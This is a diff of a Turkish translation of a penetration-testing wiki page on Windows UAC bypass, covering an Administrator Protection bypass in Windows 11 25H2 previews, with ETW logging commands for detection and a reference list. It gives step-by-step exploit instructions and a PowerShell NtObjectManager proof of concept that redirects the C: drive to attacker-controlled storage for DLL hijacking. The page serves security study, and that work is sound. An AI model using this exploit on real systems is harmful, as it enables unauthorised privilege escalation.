-> Ağustos 2026 itibarıyla Microsoft, Administrator Protection özelliğini hâlâ **Insider preview** olarak belgeliyor: Ekim 2025'teki rollout geri alındı ve daha sonraki bir tarih için planlanıyor. Bu zincirleri test etmeden önce **Admin Approval Mode with Administrator protection** özelliğinin gerçekten etkin olduğunu ve cihazın yeniden başlatıldığını doğrulayın; standart bir 25H2 version string tek başına özelliğin etkin olduğunu kanıtlamaz.<sup>[[10]](#references)</sup>
+> Ağustos 2026 itibarıyla Microsoft, Administrator Protection özelliğini hâlâ **Insider önizlemesi** olarak belgeliyor: Ekim 2025'teki dağıtım geri alındı ve daha sonraki bir tarihte yapılması planlanıyor. Bu zincirleri test etmeden önce **Admin Approval Mode with Administrator protection** özelliğinin gerçekten etkin olduğunu ve cihazın yeniden başlatıldığını doğrulayın; yalnızca stok 25H2 sürüm dizesi, özelliğin etkin olduğunu kanıtlamaz.<sup>[[10]](#references)</sup>
 
-Windows 11 25H2 preview build'lerindeki tüm `RAiLaunchAdminProcess` / UIAccess attack surface'i için özel sayfayı inceleyin:
+Windows 11 25H2 önizleme derlemelerindeki `RAiLaunchAdminProcess` / UIAccess saldırı yüzeyinin tamamı için özel sayfaya bakın:
 
 {{#ref}}
 ../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
 {{#endref}}
 
-Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'lar kullanır. Dizin, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse dizin, saldırgan **owner** olacak şekilde oluşturulur (`CREATOR OWNER`'ı devralır); bu da `\GLOBAL??` önceliğini aşan drive-letter link'lerine izin verir.<sup>[[7]](#references)</sup>
+Windows 11 25H2 “Administrator Protection”, oturum başına `\Sessions\0\DosDevices/<LUID>` eşlemelerine sahip shadow-admin token'ları kullanır. Dizin, ilk `\??` çözümlemesinde `SeGetTokenDeviceMap` tarafından tembel olarak oluşturulur. Saldırgan, shadow-admin token'ını yalnızca **SecurityIdentification** düzeyinde taklit ederse dizin, saldırgan **sahip** olacak şekilde oluşturulur (`CREATOR OWNER` devralınır); böylece sürücü harfi bağlantıları `\GLOBAL??` konumundakilere öncelik kazanır.<sup>[[7]](#references)</sup>
 
 **Adımlar:**
 
-1. Düşük ayrıcalıklı bir session'dan, prompt göstermeyen bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
-2. Primary token'ını bir **identification** token'ına duplicate edin ve `\Sessions\0\DosDevices/<LUID>` dizininin saldırgan sahipliğinde oluşturulmasını zorlamak için `\??` açarken bu token'ı impersonate edin.
-3. Buraya saldırganın kontrolündeki storage'ı gösteren bir `C:` symlink'i oluşturun; sonraki filesystem erişimleri bu session içinde `C:` konumunu saldırgan path'ine resolve ederek prompt olmadan DLL/file hijack yapılmasını sağlar.
+1. Düşük ayrıcalıklı bir oturumdan `RAiProcessRunOnce` çağırarak istem göstermeyen bir shadow-admin `runonce.exe` süreci başlatın.
+2. Birincil token'ını bir **identification** token'ına çoğaltın ve saldırganın sahipliğinde `\Sessions\0\DosDevices/<LUID>` oluşturulmasını zorlamak için `\??` açılırken bu token'ı taklit edin.
+3. Burada saldırganın denetimindeki depolamaya işaret eden bir `C:` symlink'i oluşturun; sonraki dosya sistemi erişimleri bu oturumda `C:` sürücüsünü saldırganın yoluna çözümler ve istem göstermeden DLL/dosya ele geçirmeyi mümkün kılar.
 
 **PowerShell PoC (NtObjectManager):**
 ```powershell
@@ -368,24 +399,31 @@ Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | 
 $auth = Get-NtTokenId -Authentication -Token $id
 New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
 ```
-Önizleme ana bilgisayarlarında Administrator Protection, onayları ve başarısızlıkları `Microsoft-Windows-LUA` provider'ı altında ETW event'leri **15031** ve **15032** olarak kaydeder. Event'ler, istekte bulunanın SID'sini, uygulama yolunu, sonucu, yönetilen yönetici hesabını ve authentication method'unu içerir; bu nedenle tekrarlanan exploit girişimleri veya başarısız UI yönlendirmeleri telemetry'den yoksun değildir.<sup>[[10]](#references)</sup>
+
+Önizleme hostlarında Administrator Protection, onayları ve başarısızlıkları `Microsoft-Windows-LUA` sağlayıcısı altında **15031** ve **15032** ETW olayları olarak kaydeder. Olaylar, istekte bulunanın SID'sini, uygulama yolunu, sonucu, yönetilen yönetici hesabını ve kimlik doğrulama yöntemini içerir; bu nedenle tekrarlanan exploit girişimleri veya başarısız UI otomasyonu telemetri dışında kalmaz.<sup>[[10]](#references)</sup>
+
 ```cmd
 logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
 rem reproduce the elevation attempt
 logman stop AdminProtectionTrace -ets
 ```
+
+
+
 ## References
 
 - [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
-- [2] [Microsoft Docs – User Account Control nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
-- [3] [UACME – UAC bypass techniques koleksiyonu](https://github.com/hfiref0x/UACME)
+- [2] [Microsoft Docs – Kullanıcı Hesabı Denetimi nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [3] [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
 - [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
-- [5] [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
-- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya hükümet hedeflerine karşı 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [7] [Project Zero – Windows Administrator Protection bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
-- [8] [Sigma / Detection.FYI – SilentCleanup Task kullanarak UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
+- [5] [Checkpoint Research – KONNI, PowerShell arka kapıları oluşturmak için yapay zekâdan yararlanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
+- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya'daki kamu kurumlarını hedef alan 0-Day istismarı](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
+- [7] [Project Zero – Windows Administrator Protection'ı atlatma](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [8] [Sigma / Detection.FYI – SilentCleanup görevini kullanarak UAC'yi atlatma](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
 - [9] [R41N3RZUF477 – UnifiedConsent, TabTip ve Narrator Always Notify bypass'ları](https://github.com/hfiref0x/UACME/issues/173)
-- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
-- [11] [Google Project Zero – .NET'ten Local Windows RPC Server'larını çağırma](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
-- [12] [Kaspersky Securelist – HoneyMyte, Signed Windows Kernel Rootkit ile CoolClient'ı geliştiriyor](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
+- [10] [Microsoft Learn – Yönetici koruması](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
+- [11] [Google Project Zero – .NET'ten yerel Windows RPC sunucularını çağırma](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
+- [12] [Kaspersky Securelist – HoneyMyte, CoolClient'ı imzalı bir Windows kernel rootkit'iyle geliştiriyor](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
+- [13] [Group-IB – KGB RAT: Casusluk, hırsızlık ve terör için tasarlanmış, tamamen tespit edilemeyen bir Windows trojan'ı](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
+- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
 {{#include ../../banners/hacktricks-training.md}}
